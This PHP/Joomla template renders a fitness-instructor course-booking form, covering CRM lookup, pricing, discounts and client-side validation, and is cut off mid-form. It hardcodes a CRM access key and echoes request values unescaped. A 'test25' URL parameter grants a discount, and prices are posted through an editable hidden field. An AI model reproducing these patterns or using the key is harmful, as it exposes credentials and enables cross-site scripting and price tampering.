<?php

/* Instrustor detail */

defined ( '_JEXEC' ) or die ( 'restricted access' );
JHtml::_('behavior.formvalidation');
JHtml::_('bootstrap.tooltip');
JHtml::_('behavior.multiselect');
JHtml::_('formbehavior.chosen', 'select');
/*JHTML::_('behavior.modal');*/ 

$request=JRequest::get('request');
$view = JRequest::getVar('view');
$user = JFactory::getUser();
$option = JRequest::getVar('option');
$coption = JRequest::getVar('option');
$uri = JURI::getInstance();
$user = JFactory::getUser();
$url= $uri->root();
$model=$this->getModel();
$Itemid = JRequest::getVar('Itemid');
$id	= JRequest::getVar('id');
$manual = JRequest::getVar('manual');

$schooldetail = array();

$vtparams 	=	JComponentHelper::getParams('com_jvtiger');
$vt_username = $vtparams->get('vt_username','admin');
$vt_accesskey = $vtparams->get('vt_accesskey','vohMJO8G5cBj06Ur');
$vt_hostname = $vtparams->get('vt_hostname','http://crm.clubbercise.com');

//For Discount
$vt_discount_start_datetime = $vtparams->get('discount_start_datetime');
$vt_discount_end_datetime = $vtparams->get('discount_end_datetime');
$vt_discount_type = $vtparams->get('discount_type');
$vt_discount_price = $vtparams->get('discount_price');
$vt_discount_promocode = $vtparams->get('discount_promocode');
		
list($sessionName, $userId) = JVTIGERFIELDS::login($vt_username, $vt_accesskey, $vt_hostname);
/* $element['assigned_user_id'] =  $userId; */
$queryParam = $query;
$response = JVTIGERFIELDS::vtigerwebservicenew($vt_hostname, $vt_username, array('operation'=>'retrieve','sessionName'=>$sessionName,'id'=>$id), false);
$result = $response['result'];

$is_instructor = '0';
if($user->id){
	$groups = $user->get('groups');
	if(in_array(12,$groups)){
		$is_instructor = '1'; 
	}
}

$jvtigetpostdata = @$_SESSION['jvtigetpostdata'];
/* echo "<pre>"; print_r($jvtigetpostdata); echo "</pre>"; */
$usertype = JRequest::getVar('usertype','');
$course_is_forme = 0;
if($usertype == 'me'){ $course_is_forme = 1; }

if(!$_SESSION['jvtigetpostdata']){
	
	if($usertype == 'other'){
		$jvtigetpostdata = array();
	}elseif($usertype == 'me'){
		$jvtigetpostdata = array();
		$jvtigetpostdata = (array) $this->getvtigerdetail($user->id);
		
		
		if(!$jvtigetpostdata && $_SESSION['crmaccess_'.$user->id]){
			
			$kids_combo = $_SESSION['crmaccess_'.$user->id];
			
			$jvtigetpostdata['firstname'] = $kids_combo['firstname'];
			$jvtigetpostdata['lastname'] = $kids_combo['lastname'];
			$jvtigetpostdata['email'] = $kids_combo['email'];
			$jvtigetpostdata['repeatemail'] = $kids_combo['email'];
			$jvtigetpostdata['title'] = $kids_combo['salutationtype'];
			
			$jvtigetpostdata_date = $kids_combo['birthday'];
			$jvtigetpostdata['dob_day'] = date('d',strtotime($jvtigetpostdata_date));
			$jvtigetpostdata['dob_month'] = date('m',strtotime($jvtigetpostdata_date));
			$jvtigetpostdata['dob_year'] = date('Y',strtotime($jvtigetpostdata_date));
			
			$jvtigetpostdata['city'] = $kids_combo['cf_929'];
			$jvtigetpostdata['country'] = $kids_combo['cf_1547'];
			$jvtigetpostdata['postcode'] = $kids_combo['cf_931'];
			$jvtigetpostdata['mobile'] = $kids_combo['cf_801'];
			$jvtigetpostdata['address1'] = $kids_combo['cf_803'];
			$jvtigetpostdata['address2'] = $kids_combo['cf_915'];
			
			$jvtigetpostdata['completed_courses'] = str_replace("|##|","|",$jvtigetpostdata['cf_847']);
			   
			/* echo "<pre>"; print_r($_SESSION['crmaccess_'.$user->id]); echo "</pre>"; */
			
		}else{
			
			$jvtigetpostdata_date = $jvtigetpostdata['dob'];
			$jvtigetpostdata['dob_day'] = date('d',strtotime($jvtigetpostdata_date));
			$jvtigetpostdata['repeatemail'] = $jvtigetpostdata['email'];
			$jvtigetpostdata['dob_month'] = date('m',strtotime($jvtigetpostdata_date));
			$jvtigetpostdata['dob_year'] = date('Y',strtotime($jvtigetpostdata_date));
			
		}
		
	}
} 
 
/* echo "<pre>"; print_r($jvtigetpostdata); */
$completed_courses = $jvtigetpostdata['completed_courses'];
$completedcourses = explode("|",$completed_courses);

$completedcourses_areyou = $jvtigetpostdata['are_you'];

$countries = array("GB" => "United Kingdom","AF" => "Afghanistan","AX" => "Åland Islands","AL" => "Albania","DZ" => "Algeria","AS" => "American Samoa","AD" => "Andorra","AO" => "Angola","AI" => "Anguilla","AQ" => "Antarctica","AG" => "Antigua and Barbuda","AR" => "Argentina","AM" => "Armenia","AW" => "Aruba","AU" => "Australia","AT" => "Austria","AZ" => "Azerbaijan","BS" => "Bahamas","BH" => "Bahrain","BD" => "Bangladesh","BB" => "Barbados","BY" => "Belarus","BE" => "Belgium","BZ" => "Belize","BJ" => "Benin","BM" => "Bermuda","BT" => "Bhutan","BO" => "Bolivia","BA" => "Bosnia and Herzegovina","BW" => "Botswana",
"BV" => "Bouvet Island","BR" => "Brazil","IO" => "British Indian Ocean Territory","BN" => "Brunei Darussalam","BG" => "Bulgaria","BF" => "Burkina Faso","BI" => "Burundi","KH" => "Cambodia","CM" => "Cameroon","CA" => "Canada","CV" => "Cape Verde","KY" => "Cayman Islands","CF" => "Central African Republic","TD" => "Chad","CL" => "Chile","CN" => "China","CX" => "Christmas Island","CC" => "Cocos (Keeling) Islands","CO" => "Colombia","KM" => "Comoros","CG" => "Congo","CD" => "Congo, The Democratic Republic of The","CK" => "Cook Islands","CR" => "Costa Rica","CI" => "Cote D'ivoire",
"HR" => "Croatia","CU" => "Cuba","CY" => "Cyprus","CZ" => "Czech Republic","DK" => "Denmark","DJ" => "Djibouti","DM" => "Dominica","DO" => "Dominican Republic","EC" => "Ecuador","EG" => "Egypt","SV" => "El Salvador","GQ" => "Equatorial Guinea","ER" => "Eritrea","EE" => "Estonia","ET" => "Ethiopia","FK" => "Falkland Islands (Malvinas)","FO" => "Faroe Islands","FJ" => "Fiji","FI" => "Finland","FR" => "France","GF" => "French Guiana","PF" => "French Polynesia","TF" => "French Southern Territories","GA" => "Gabon","GM" => "Gambia","GE" => "Georgia","DE" => "Germany","GH" => "Ghana","GI" => "Gibraltar","GR" => "Greece",
"GL" => "Greenland","GD" => "Grenada","GP" => "Guadeloupe","GU" => "Guam","GT" => "Guatemala","GG" => "Guernsey","GN" => "Guinea","GW" => "Guinea-bissau","GY" => "Guyana","HT" => "Haiti","HM" => "Heard Island and Mcdonald Islands","VA" => "Holy See (Vatican City State)","HN" => "Honduras","HK" => "Hong Kong","HU" => "Hungary","IS" => "Iceland","IN" => "India","ID" => "Indonesia","IR" => "Iran, Islamic Republic of","IQ" => "Iraq","IE" => "Ireland","IM" => "Isle of Man","IL" => "Israel","IT" => "Italy","JM" => "Jamaica","JP" => "Japan","JE" => "Jersey","JO" => "Jordan","KZ" => "Kazakhstan","KE" => "Kenya","KI" => "Kiribati","KP" => "Korea, Democratic People's Republic of","KR" => "Korea, Republic of",
"KW" => "Kuwait","KG" => "Kyrgyzstan","LA" => "Lao People's Democratic Republic","LV" => "Latvia","LB" => "Lebanon","LS" => "Lesotho","LR" => "Liberia","LY" => "Libyan Arab Jamahiriya","LI" => "Liechtenstein","LT" => "Lithuania","LU" => "Luxembourg","MO" => "Macao","MK" => "Macedonia, The Former Yugoslav Republic of","MG" => "Madagascar","MW" => "Malawi","MY" => "Malaysia","MV" => "Maldives","ML" => "Mali","MT" => "Malta","MH" => "Marshall Islands","MQ" => "Martinique","MR" => "Mauritania","MU" => "Mauritius","YT" => "Mayotte","MX" => "Mexico","FM" => "Micronesia, Federated States of","MD" => "Moldova, Republic of","MC" => "Monaco","MN" => "Mongolia","ME" => "Montenegro","MS" => "Montserrat","MA" => "Morocco","MZ" => "Mozambique",
"MM" => "Myanmar","NA" => "Namibia","NR" => "Nauru","NP" => "Nepal","NL" => "Netherlands","AN" => "Netherlands Antilles","NC" => "New Caledonia","NZ" => "New Zealand","NI" => "Nicaragua","NE" => "Niger","NG" => "Nigeria","NU" => "Niue","NF" => "Norfolk Island","MP" => "Northern Mariana Islands","NO" => "Norway","OM" => "Oman","PK" => "Pakistan","PW" => "Palau","PS" => "Palestinian Territory, Occupied","PA" => "Panama","PG" => "Papua New Guinea","PY" => "Paraguay","PE" => "Peru","PH" => "Philippines","PN" => "Pitcairn","PL" => "Poland","PT" => "Portugal","PR" => "Puerto Rico","QA" => "Qatar","RE" => "Reunion","RO" => "Romania","RU" => "Russian Federation","RW" => "Rwanda",
"SH" => "Saint Helena","KN" => "Saint Kitts and Nevis","LC" => "Saint Lucia","PM" => "Saint Pierre and Miquelon","VC" => "Saint Vincent and The Grenadines","WS" => "Samoa","SM" => "San Marino","ST" => "Sao Tome and Principe","SA" => "Saudi Arabia","SN" => "Senegal","RS" => "Serbia","SC" => "Seychelles","SL" => "Sierra Leone","SG" => "Singapore","SK" => "Slovakia","SI" => "Slovenia","SB" => "Solomon Islands","SO" => "Somalia","ZA" => "South Africa","GS" => "South Georgia and The South Sandwich Islands","ES" => "Spain","LK" => "Sri Lanka","SD" => "Sudan","SR" => "Suriname","SJ" => "Svalbard and Jan Mayen","SZ" => "Swaziland","SE" => "Sweden","CH" => "Switzerland","SY" => "Syrian Arab Republic","TW" => "Taiwan, Province of China","TJ" => "Tajikistan","TZ" => "Tanzania, United Republic of",
"TH" => "Thailand","TL" => "Timor-leste","TG" => "Togo","TK" => "Tokelau","TO" => "Tonga","TT" => "Trinidad and Tobago","TN" => "Tunisia","TR" => "Turkey","TM" => "Turkmenistan","TC" => "Turks and Caicos Islands","TV" => "Tuvalu","UG" => "Uganda","UA" => "Ukraine","AE" => "United Arab Emirates","US" => "United States","UM" => "United States Minor Outlying Islands","UY" => "Uruguay","UZ" => "Uzbekistan","VU" => "Vanuatu",
"VE" => "Venezuela","VN" => "Viet Nam","VG" => "Virgin Islands, British","VI" => "Virgin Islands, U.S.","WF" => "Wallis and Futuna","EH" => "Western Sahara","YE" => "Yemen","ZM" => "Zambia","ZW" => "Zimbabwe");

$canaccess_KidsCombo = 0;
$canget_discount = 0;
					
/* if($under_18 == "Kids Combo"){ */
	$KidsCombo_crmaccess = $_SESSION['crmaccess_'.$user->id];
	if($KidsCombo_crmaccess){
		if($KidsCombo_crmaccess['cf_933'] && $KidsCombo_crmaccess['cf_985'] == "Yes"){
			$canaccess_KidsCombo = 1;
			if($KidsCombo_crmaccess['cf_1169'] && $KidsCombo_crmaccess['cf_1155'] == "Yes"){
				$canget_discount = 1;
			}
		}else if($KidsCombo_crmaccess['cf_1169'] && $KidsCombo_crmaccess['cf_1155'] == "Yes"){
			$canget_discount = 1;
			$canaccess_KidsCombo = 1;
		}
	}
/* } */

?>
<style>
	#alert_dialog a{color: #f00c93;}
	#alertmesssage{ margin-bottom: 15px;}
	#hidden{ display: none;}
	#confirm_checkbox_label a.active {color: #FF1300 !important;}
	#checkbox_agree_label a.active {color: #FF1300 !important;}
	#completed_courses1_label.active {color: #FF1300 !important;}
	/*arpita*/
	#checkbox_CodeofConduct_label a.active_new {color: #FF1300 !important;}
	/*end*/
	#are_you1_label.active {color: #FF1300 !important;}
	#mycheckboxes_areyou {margin-bottom: 90px;}
	.bottom-part .control-group.checkboxes{position: relative;}
	#confirm_checkbox_label.control-label-under18{color: #f00c93;}
	#alertmsg{ font-size: 15px;color:#ff0000;}
	#where-are-you-title {width: 25%;}
	.bottom-part .control-group .controls.tick-course.areyousection {width: 75%;}
	@media only screen and (max-width: 767px) {
		.bottom-part .control-group .controls.tick-course.areyousection {
			width: 100%;
		}
		#where-are-you-title {
			width: 100%;
		}
	}
	@media only screen and (min-width : 800px) {
		.promocodes {
	    padding-top: 30px;
	}}
	.form-details .kidclsclb{padding-top:0px;}
</style>
<div class="course-booking" id="course-booking">
<div class="row-fluid" >
	<div class="item-page ">
		<?php if($result){
			
			$countrycode =  $result['cf_1625'];
			$country_code2ltr = JVTIGERFIELDS::getCountrycode2ltr($countrycode);
			
			$under_18 = $result['cf_1131'];
			/*$under_18 = "Kids Combo";*/
			?>
			<script>
				function closeForm(){
					var form=document.adminForm;
					form.task.value="cancel";
					document.getElementById('adminForm').submit(); 
				}
				function save(){
					
					var f = document.adminForm;
					
					<?php if($under_18 != "Kids Combo"){?>
						var checkedc1 = jQuery("#mycheckboxes_areyou :radio:checked").length;
					<?php }else{ ?>
						var checkedc1 = 1;
					<?php } ?>
					
					var checkedc = jQuery("#mycheckboxes :checkbox:checked").length;
					checkrequiredfield();
					
					validemail_save();
				
					if(!document.formvalidator.isValid(f)){
						jQuery("#alert_dialog").dialog({
							width:380,
							resizable: false,
							modal: true
						});
					}
			        	
					<?php if(!$user->id){?>
						if(jQuery('#password').val() !=  jQuery('#repassword').val()) {
				            jQuery('#submitbuttonserrormsg').text('Password and Repeat Password must be same.');
				            return false;   
				        }
			        <?php } ?>
					if(jQuery('#repeatemail').val() !=  jQuery('#email').val()) {
			            jQuery('#submitbuttonserrormsg').text('Email and Repeat email must be same.');
			            return false;   
			        }
			      
			        if(jQuery('#country').val() == 'Australia')
			        {
			        	 if(jQuery('#county').val() == "")
			        	 {
			        	 	
			        	 	return false;
			        	 }
			        }
			        
			        if(document.formvalidator.isValid(f) && checkedc > 0 && checkedc1 > 0) {
			            jQuery('#submitbuttonserrormsg').text('');
			               
			        }else{
			        	
			        	var allvalids = jQuery(".top-contents .control-group .invalid").length;
			        	
			        	if(allvalids == 0){
			        		
				        	if(jQuery('#confirm_checkbox').prop('checked') == false){				        		
				        		jQuery('#confirm_checkbox_label a').addClass('active');
				        		/*jQuery('#confirm_checkbox').focus();
				        		jQuery(window).scrollTop(jQuery('#confirm_checkbox').position().top);*/				        		 
				        	} else if(checkedc1 == 0){
				        		jQuery('#are_you1_label').addClass('active');
				        		/*jQuery('#are_you1').focus();
				        		jQuery(window).scrollTop(jQuery('#confirm_checkbox').position().top);	*/			        		
				        	} else if(checkedc == 0){
				        		jQuery('#completed_courses1_label').addClass('active');
				        		/*jQuery('#completed_courses1').focus();
				        		jQuery(window).scrollTop(jQuery('#confirm_checkbox').position().top);*/				        		
				        	} /*arpita*/
				        	else if(jQuery('#checkbox_CodeofConduct').prop('checked') == false){                    
			                    jQuery('#checkbox_CodeofConduct_label a').addClass('active_new');
			                    /* jQuery('#checkbox_CodeofConduct').focus();
			                    jQuery(window).scrollTop(jQuery('#checkbox_agree').position().top); */
			                    
			                  }/*end*/
			                  else if(jQuery('#checkbox_agree').prop('checked') == false){				        		
				        		jQuery('#checkbox_agree_label a').addClass('active');
				        		/*jQuery('#checkbox_agree').focus();
				        		jQuery(window).scrollTop(jQuery('#checkbox_agree').position().top); */
				        		
				        	} else if(jQuery('#checkbox_qualification').prop('checked') == false){
                                jQuery('#checkbox_qualification_label a').addClass('active');
                            }
				        	 
			        	}
			        	
			        	jQuery('#submitbuttonserrormsg').text('We\'re sorry - there are a few more fields that you need to complete to continue.');
			        	
			        	jQuery("#alert_dialog").dialog({
							width:380,
							resizable: false,
							modal: true
						});
			        	return false; 
			        }

			        if(jQuery('#promocode').length){
				        if(jQuery('#coupon_applied').val() == 0 && jQuery('#promocode').val() != ''){
				        	var urls = '<?php echo JURI::base();?>index.php?option=com_jvtiger&view=instructordetail&task=checkcoupons&type=proceed&tmpl=1';
							var coupon = document.getElementById('promocode').value;
							var country_code = '<?php echo $country_code2ltr; ?>';
							var course_type = '<?php echo $result['id']; ?>';
							jQuery.post(urls,{coupon:coupon,country_code:country_code,course_type:course_type},
							    function(data,status){
							    	 document.getElementById('couponmessage').innerHTML=data;
							    	 if(jQuery.trim(data) == 'applied'){
							    	 	var form=document.adminForm;
										form.task.value="save";
										form.submit(); 	
							    	 }else{
							    	 	return false;
							    	 }
							    }
							);
							return false;
				        }
				    }
			       
			        var form=document.adminForm;
					form.task.value="save";
					form.submit();  
				}
				
				jQuery(document).ready(function(){
					jQuery('#county-span-valid').hide();
					
					jQuery("select").change( function(){
							var country_value = jQuery('#country').val();
							if(country_value == 'Australia')
							{
								jQuery('#county').css('border-color', '#ff0000');
								jQuery('#county-span-valid').show();
								
							}
							else
							{
								jQuery('#county').css('border-color', '#aaaaaa');
								jQuery('#county-span-valid').hide();
									
							}		

						});

					validemail();

					
					<?php if($jvtigetpostdata['email']){ ?>
						jQuery('#email').trigger('blur'); 
					<?php } ?>
					
					jQuery('#applycoupon').click( function(){

						var urls = '<?php echo JURI::base();?>index.php?option=com_jvtiger&view=instructordetail&task=checkcoupons&tmpl=1';
						var coupon = document.getElementById('promocode').value;
						var country_code = '<?php echo $country_code2ltr; ?>';
						var course_type = '<?php echo $result['id']; ?>';
						jQuery.post(urls,{coupon:coupon,country_code:country_code,course_type:course_type},
						    function(data,status){
						    	 document.getElementById('couponmessage').innerHTML=data;
						    	 jQuery('#coupon_applied').val(1); 
							}
						);
					});
					//arpita //
				jQuery('input[type="radio"]').click(function(){
	                var checkedc1 = jQuery("#mycheckboxes_areyou :radio:checked").length; 
		                  if(checkedc1 == 1)
		                  {
		                    jQuery('#are_you1_label').removeClass('active');
		                  }
	         		   });

				jQuery('input[type="checkbox"]').click(function(){
					var checkedcS = jQuery("#checkbox_agree :checkbox:checked").length;

					if(checkedcS == 1)
					{
						 jQuery('.control-label').removeClass('active');
					}
					var checkedc3 = jQuery("#checkbox_CodeofConduct :checkbox:checked").length;
					
					if(checkedc3 == 0)
					{
						 jQuery('.control-label .active').removeClass('active_new');
					}
	                var checkedc = jQuery("#mycheckboxes :checkbox:checked").length;
	                  if(checkedc == 1)
	                  {
	                    jQuery('#completed_courses1_label').removeClass('active');
	                  }
	               
	            });
				//end arpita //

				});
				
				function selectotheropt(val){
					if(val=="Other"){
						jQuery("#other_textfild").show();
					}else{
						jQuery("#other_textfild").hide();
					}
				  
				}
				function checkboxvalidation(id,label){
					if(jQuery('#'+id).prop('checked') == false){
				        
				        jQuery('#'+label+' a').addClass('active');

				       
				    }else{
				    	jQuery('#'+label+' a').removeClass('active');
				    }
				}
				
				function checkrequiredfield(){
					var dob_day = jQuery('#dob_day').val();
					var dob_month = jQuery('#dob_month').val();
					var dob_year = jQuery('#dob_year').val();
					var country_value = jQuery('#country').val();
					var county_value = jQuery('#county').val()
					if(country_value == 'Australia')
					{
						jQuery('#county').css('border-color', '#ff0000');
						jQuery('#county-span-valid').show();
						
						if(county_value == ''){
							jQuery('#county_chzn .chzn-single').css('border-color', '#ff0000');
						}else{
							jQuery('#county_chzn .chzn-single').css('border-color', '#aaaaaa');
						}	
					}
					else
					{
						jQuery('#county').css('border-color', '#aaaaaa');
						jQuery('#county-span-valid').hide();
							
					}	

					if(country_value == ''){
						jQuery('#country_chzn .chzn-single').css('border-color', '#ff0000');
					}else{
						jQuery('#country_chzn .chzn-single').css('border-color', '#aaaaaa');
					}
					
					if(dob_day == ''){
						jQuery('#dob_day_chzn .chzn-single').css('border-color', '#ff0000');
					}else{
						jQuery('#dob_day_chzn .chzn-single').css('border-color', '#aaaaaa');
					}
					
					if(dob_month == ''){
						jQuery('#dob_month_chzn .chzn-single').css('border-color', '#ff0000');
					}else{
						jQuery('#dob_month_chzn .chzn-single').css('border-color', '#aaaaaa');
					}
					
					if(dob_year == ''){
						jQuery('#dob_year_chzn .chzn-single').css('border-color', '#ff0000');
					}else{
						jQuery('#dob_year_chzn .chzn-single').css('border-color', '#aaaaaa');
					}
					
				}

				function validemail_save(e)
				{
					<?php if(!$user->id || ($usertype == 'other' && $user->id) || (!$is_instructor && $usertype == 'me' && $user->id)){ ?>
						var exist_email = jQuery("#exist_email").val();
						
						if(exist_email == 1){
							var str = "The provided email address has already been used.";
							var str2 = "Please use a different email address or sign into your account.";
							jQuery("#alertmesssage").show();
							jQuery("#alertmsg").html(str+"<br />"+str2);
							e.preventDefault();
							return false;
						}else if(exist_email == 2){
							var str = "The provided email address is already an instructor.";
							var str2 = "Please use a different email address or sign into your account.";
							jQuery("#alertmesssage").show();
							jQuery("#alertmsg").html(str+"<br />"+str2);
							e.preventDefault();
							return false;
						}else if(exist_email == 3){
							var str = "The provided email address is already an instructor.";
							var str2 = "Please contact <a href='mailto:team@clubbercise.com'>team@clubbercise.com</a>."; 
							jQuery("#alertmesssage").show();
							jQuery("#alertmsg").html(str+"<br />"+str2);
							e.preventDefault();
							return false;
						}else{
							jQuery("#alertmsg").html('');
							jQuery("#alertmesssage").hide();
						}
					<?php } ?>
				
				}

				function validemail(){

					<?php if(!$user->id || ($usertype == 'other' && $user->id) || (!$is_instructor && $usertype == 'me' && $user->id)){ ?>
						


						jQuery("#email").on('blur',function(){

							var email = jQuery("#email").val();

							email = email.trim();
							
							<?php if(!$is_instructor && $user->id && $usertype == 'me'){?>
								var instructor = 1;
							<?php }else{ ?>
								var instructor = 0;
							<?php }?>
							
							jQuery.ajax({
								type: "POST",
								url: "<?php echo JURI::base();?>index.php?option=com_jvtiger&view=instructordetail&task=getEmails&email="+email+"&instructor="+instructor+"&tmpl=1",
								success: function(data){
									if(data == 1){
										jQuery("#exist_email").val(data);
										var str = "The provided email address has already been used.";
										var str2 = "Please use a different email address or sign into your account.";
										jQuery("#alertmesssage").show();
										jQuery("#alertmsg").html(str+"<br />"+str2);
										return false;
									}else if(data == 2){
										jQuery("#exist_email").val(data);
										var str = "The provided email address is already an instructor.";
										var str2 = "Please use a different email address or sign into your account.";
										jQuery("#alertmesssage").show();
										jQuery("#alertmsg").html(str+"<br />"+str2);
										return false;
									}else if(data == 3){
										jQuery("#exist_email").val(data);
										var str = "The provided email address is already an instructor.";
										var str2 = "Please contact <a href='mailto:team@clubbercise.com'>team@clubbercise.com</a>."; 
										jQuery("#alertmesssage").show();
										jQuery("#alertmsg").html(str+"<br />"+str2);
										return false;
									}else{
										jQuery("#exist_email").val(data);
										jQuery("#alertmsg").html('');
										jQuery("#alertmesssage").hide();
									}
									
								}
							});
						});
					<?php } ?>

				}
			</script>
	
			<div class="course-detail">
				<div class="coursename"><?php echo $result['coursename']; ?></div>
		       	<?php /*if($under_18 != "Kids Combo"){ ?>
		       		<span class="coursetext" style="width: 100%; display: block;"><?php echo $under_18;?></span>
		       	<?php }*/ ?>
				<div class="clear"></div>
		    </div>
		    
		    <?php 
		    	if($usertype == 'me' && !$canaccess_KidsCombo && $under_18 != "Kids Combo"){?> 
			    	<!---<h4 style="color: #f00c93;"><?php echo JText::_('- 15% existing instructor discount applied.');?></h4>--->
			    	<h4><?php echo JText::_('Please check the information we hold is correct.');?></h4>
		    <?php }  
				if($usertype == 'me' && $canaccess_KidsCombo && $under_18 == "Kids Combo" && $canget_discount){ ?>
					<!---<h4 style="color: #f00c93;"><?php echo JText::_('50% Discount Applied for existing U18 Instructor.');?></h4>--->
					<h4><?php echo JText::_('Please check the information we hold is correct.');?></h4>
			<?php }
			
		    $currency_code = $vtparams->get('vt_currency_id','GBP');
			if($countrycode == "UK"){
				$currency_code = $currency_code;
			}else if($countrycode == "Australia"){
				$currency_code = $vtparams->get('vt_currency_id_australia','AUD');
			}else if($countrycode == "Germany"){
				$currency_code = $vtparams->get('vt_currency_id_germany','EUR');
			}else if($countrycode == "Thailand"){
				$currency_code = $vtparams->get('vt_currency_id_thailand','GBP');
			}else{
				$currency_code = $currency_code;
			}
			
			$CourseVenueName =  $result['cf_827'];
			$VenueTownCity =  $result['cf_963'];
			$VenueStreetAddress =  $result['cf_860'];
			$VenuePostCode =  $result['cf_872'];
			$CourseStartTimeraw =  $result['cf_765'];
			$CourseStartTime =  date("g:ia",strtotime($CourseStartTimeraw));
			
			$CourseEndTimeraw =  $result['cf_837'];
			$CourseEndTime = date("g:ia",strtotime($CourseEndTimeraw));
			
			/* echo "<pre>"; print_r($result); echo "</pre>"; */
			
			$course_mentor = $result['course_mentor'];
			 
		?>
		<form name="adminForm" id="adminForm" action="<?php echo JRoute::_('index.php?option='.$option.'&view='.$view.'&Itemid='.$Itemid, $xhtml = true, $ssl=null ) ?>" method="post" 
		enctype="multipart/form-data" class="form-horizontal form-validate" >
		    	<input type="hidden" name="coursename" id="coursename" value="<?php echo $result['coursename'];?>" />
		    	<input type="hidden" name="course_mentor" value="<?php echo $result['course_mentor'];?>" />
		    	<input type="hidden" name="course_county" value="<?php echo $result['cf_1625'];?>" />
		    	
		    	<input type="hidden" name="assigned_user_id" value="<?php echo $result['assigned_user_id'];?>" />
		    	<input type="hidden" name="usertype" value="<?php echo $usertype;?>" />
		    	<input type="hidden" name="typeofcourse" value="<?php echo $result['cf_1131'];?>" />
		    	
		    	<input type="hidden" name="CourseEndTime" value="<?php echo $CourseEndTime;?>" />
		    	<input type="hidden" name="CourseVenueName" value="<?php echo $CourseVenueName;?>" />
		    	<input type="hidden" name="VenueTownCity" value="<?php echo $VenueTownCity;?>" />
		    	<input type="hidden" name="VenueStreetAddress" value="<?php echo $VenueStreetAddress;?>" />
		    	<input type="hidden" name="VenuePostCode" value="<?php echo $VenuePostCode;?>" />
		    	<input type="hidden" name="CourseStartTime" value="<?php echo $CourseStartTime;?>" />
		    	
		    	<?php if($under_18 == "Kids Combo"){?>
		    		<input type="hidden" name="AdultLicenceType" value="<?php echo $_SESSION['crmaccess_'.$user->id]['cf_979'];?>" />
		    	<?php } ?>

                <?php if ($manual): ?>
                    <input type="hidden" name="manual" value="true">
                <?php endif; ?>
		    	
		    	<!--
		    	<div class="early-bird-cut-off-date">Early bird cut-off date : <?php echo $earlybird_date = $result['cf_767'];?></div>
		    	<div class="early-bird-cut-off-date">Standard Price cut-off date : <?php echo $standard_date = $result['cf_864'];?></div>
		    	<div class="early-bird-cut-off-date">Last Minute cut-off date : <?php echo $lastminute_date = $result['cf_769'];?></div>
		        
		        <div class="early-bird-price">Early Bird Price : <?php echo $earlybird_price = $result['cf_870'];?></div>
		        <div class="standard-price">Standard Price : <?php echo $standard_price = $result['cf_866'];?></div>
		        <div class="early-bird-price">Last Minute Price : <?php echo $lastminute_price = $result['cf_868'];?></div> --> 
		        
		        <?php
		        	$current_date = date('Y-m-d'); 
			    	$earlybird_price = $result['cf_870'];
					$standard_price = $result['cf_866'];
					$lastminute_price = $result['cf_868'];
					
					$earlybird_date = $result['cf_767'];
					$standard_date = $result['cf_864'];
					$lastminute_date = $result['cf_769'];
					$course_date = $result['cf_833'];
					
					/* if($result['id'] == "36x145956"){ $under_18 = "Kids Combo"; } */
					
				if(strtotime($earlybird_date) >= strtotime($current_date)){
		        	
					$courceid = $result['id'];
					$courceid = @explode('x', $courceid);
					$courceid = @$courceid[1];
					$url = 'http://crm.clubbercise.com/vtigerjoomlarelation.php?courceid='.$courceid.'&type=capacity';
					$vtiger_totals = file_get_contents($url);
					$vtiger_totals = json_decode($vtiger_totals);
					$totalbookings = $vtiger_totals->capacity;
					
					if($totalbookings >= 15){
						$amounts = $standard_price;
					}else{
						$amounts = $earlybird_price;
					}
					
					//add for 26 sept discount
					$discount_amount = 	$earlybird_price;
						
		         }elseif(strtotime($standard_date) >= strtotime($current_date)){
		         		
		         	$amounts = $standard_price;
					
					//add for 26 sept discount
					$discount_amount = 	$standard_price;
					
		         }elseif(strtotime($lastminute_date) >= strtotime($current_date)){
		         		
		         	$amounts = $lastminute_price;
					
					//add for 26 sept discount
					$discount_amount = 	$lastminute_price;
					
		         }
				 
				 if(strtotime($current_date) <= strtotime('2017-07-08 08:00:00') && $under_18 == "Kids Combo"){
				 	$amounts = $earlybird_price;
				 }
				 
				 $enable_discount_for_existing_users = $vtparams->get('enable_discountfor_existuser');
				 $discount_price = $vtparams->get('existsuser_discount');
				 /*
				 if($canaccess_KidsCombo && $under_18 == "Kids Combo"){
				 	
				 	if($canget_discount && strtotime(date('Y-m-d H:i:s')) >= strtotime('2017-11-25 08:00:00') &&  strtotime(date('Y-m-d H:i:s')) <= strtotime('2017-12-31 23:59:00') ){ 
						$amounts = round($amounts-((50*$amounts)/100),2);
					}
					
				 }else{ */
				 
					 if($usertype == 'me' && $enable_discount_for_existing_users){
					 	if($discount_price > 0){
					 		$amounts = round($amounts-(($discount_price*$amounts)/100),2); 
						}
					 }
					 
				 /* } */ 
				 
				if((strtotime(date('Y-m-d H:i:s')) >= strtotime('2018-01-01 12:00:00') &&  strtotime(date('Y-m-d H:i:s')) <= strtotime('2018-01-07 23:59:00')) || JRequest::getVar('test25') ){ 
						$amounts = round($amounts-((25*$amounts)/100),2);
				}
				
				//Start - Apply 26 sept discount on all course 
				$user_country = trim(file_get_contents('https://ipinfo.io/'.$_SERVER['REMOTE_ADDR'].'/country'));
				$inZone = ($user_country == "GB" || $user_country == "AU" || $user_country == "IN")?1:1;
				
				if(strtotime(date('Y-m-d H:i:s')) >= strtotime($vt_discount_start_datetime) && strtotime(date('Y-m-d H:i:s')) <= strtotime($vt_discount_end_datetime) && $inZone){
					if($vt_discount_type){
						$amounts = round(($discount_amount - $vt_discount_price),2);	
					}else{
						$amounts = round(($discount_amount - (($vt_discount_price*$discount_amount)/100)),2);
					}
				}
				
				//Show Promocode field or not
				if((strtotime(date('Y-m-d H:i:s')) >= strtotime($vt_discount_start_datetime) && strtotime(date('Y-m-d H:i:s')) <= strtotime($vt_discount_end_datetime)) && !$vt_discount_promocode && $inZone){
					$show_vt_discount_promocode = 0;
				}elseif((strtotime(date('Y-m-d H:i:s')) >= strtotime($vt_discount_start_datetime) && strtotime(date('Y-m-d H:i:s')) <= strtotime($vt_discount_end_datetime)) && $vt_discount_promocode && $inZone){
					$show_vt_discount_promocode = 1;
				}elseif((strtotime(date('Y-m-d H:i:s')) >= strtotime($vt_discount_start_datetime) && strtotime(date('Y-m-d H:i:s')) <= strtotime($vt_discount_end_datetime)) && $inZone){
					$show_vt_discount_promocode = 0;
				}else{
					$show_vt_discount_promocode = 1;
				}	
				//End - Apply 26 sept discount on all course
				 
				 	
		        ?>
		        <input type="hidden" name="coursepris" value="<?php echo $amounts;?>" />
		        <input type="hidden" name="course_date" value="<?php echo $course_date;?>" />
		        
		        <div class="form-details clearfix">
					<div class="top-contents">
